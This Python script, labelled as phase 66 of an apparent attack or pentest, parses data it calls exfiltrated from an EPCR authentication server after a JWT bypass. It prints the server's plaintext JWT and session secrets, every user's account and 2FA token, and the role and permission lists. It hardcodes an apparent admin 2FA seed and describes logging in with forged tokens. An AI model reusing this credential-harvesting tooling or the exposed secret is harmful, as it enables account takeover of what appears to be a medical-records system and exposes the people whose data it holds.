#!/usr/bin/env python3
"""Phase 66: Parse and summarize exfiltrated EPCR data."""
import json, re, base64

# Read the exfiltrated data
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/epcr_jwt_exploit_results.json', 'r') as f:
    data = json.load(f)

print("=" * 60)
print("EPCR Auth Server JWT Bypass Exploitation Report")
print("=" * 60)

# 1. Config
print("\n### Server Configuration (/config)")
config = json.loads(data['/config']['body'])
print(f"  JWT_PASSWORD: {config['JWT_PASSWORD']}")
print(f"  JWT_TOKEN_EXPIRE: {config['JWT_TOKEN_EXPIRE']} seconds")
print(f"  useHttps: {config['useHttps']}")
print(f"  certDir: {config.get('httpsConfig', {}).get('certDir', 'N/A')}")
print(f"  captcha enabled: {config['captcha']['enable']}")
print(f"  sessionSecret: {config['captcha']['sessionSecret']}")
print(f"  MAX_IDLE_DURATION: {config.get('MAX_IDLE_DURATION', 'N/A')} ms")
print(f"  fail2ban_enable: {config.get('fail2ban_enable', 'N/A')}")
print(f"  fail2ban_count: {config.get('fail2ban_count', 'N/A')}")

# 2. Users
print("\n### User Accounts (/Users)")
users = json.loads(data['/Users']['body'])
print(f"  Total users: {len(users)}")
for user in users:
    print(f"    [{user['id']}] {user['name']} / account: {user['account']} / role: {user.get('Role', {}).get('name', 'N/A')} / disabled: {user.get('disabled', False)} / 2FA: {user.get('use2FA', False)}")
    if user.get('token2FA'):
        print(f"        2FA token: {user['token2FA']}")
    if user.get('extAccount'):
        print(f"        extAccount (LDAP/SSO): {user['extAccount']}")
    if user.get('customData'):
        print(f"        customData: {user['customData'][:50]}...")

# 3. Roles
print("\n### Roles (/Roles)")
roles = json.loads(data['/Roles']['body'])
print(f"  Total roles: {len(roles)}")
for role in roles:
    perms = [p['name'] for p in role.get('Permissions', [])]
    print(f"  [{role['id']}] {role['name']}: {perms}")

# 4. Permissions
print("\n### Permissions (/Permissions)")
perms = json.loads(data['/Permissions']['body'])
print(f"  Total permissions: {len(perms)}")
for perm in perms:
    print(f"  [{perm['id']}] {perm['name']}")

# 5. Key findings
print("\n### Critical Findings:")
print(f"  - JWT_SECRET: {config['JWT_PASSWORD']} (stored in plaintext in /config)")
print(f"  - All users, roles, and permissions extracted")
print(f"  - 2FA tokens exposed for all users")
print(f"  - Login bypass via ?token=<forged_jwt> (JWT signed with exposed secret)")
print(f"  - POST /Users and POST /Roles accept unauthenticated requests (need JWT)")
print(f"  - Admin account: admin / *** (2FA token: OQ3SSPTROBJD4JRQFZFFIUZBNFMDAT2KJN5HITTUMZSSG2ZIMNSA)")

# Save parsed summary
summary = {
    "jwt_secret": config['JWT_PASSWORD'],
    "user_count": len(users),
    "role_count": len(roles),
    "permission_count": len(perms),
    "users": users,
    "roles": roles,
    "permissions": perms,
    "config": config
}
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/epcr_exfil_summary.json', 'w') as f:
    json.dump(summary, f, indent=2, default=str, ensure_ascii=False)
print(f"\nFull summary saved to: /mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/epcr_exfil_summary.json")
